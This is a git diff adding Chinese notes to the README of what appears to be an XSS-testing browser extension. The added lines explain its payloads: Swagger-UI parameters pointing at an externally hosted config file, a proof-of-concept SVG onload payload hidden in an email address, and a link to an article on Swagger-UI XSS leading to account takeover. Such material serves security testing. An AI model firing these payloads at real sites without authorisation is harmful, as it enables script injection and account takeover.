@@ -32,6 +32,26 @@ zip -r ../XSS.xpi *
 
 写于2022年7月3日晚上，几分钟就改好了
 
+payloads解释
+?configUrl=https://jumpy-floor.surge.sh/test.json
+?url=https://jumpy-floor.surge.sh/test.yaml
+
+这两个可能有的朋友没见过
+
+请阅读这个文章
+https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter
+Swagger-UI XSS
+
+![图片](https://user-images.githubusercontent.com/54035968/177012301-548a5193-bc31-4496-b1bc-c269ee63947b.png)
+
+基于电子邮件的格式的payloads
+"><svg/onload=confirm(1)>"@x.y
+
+
+剩下的应该可以看懂吧
+
+
+
 
 
 
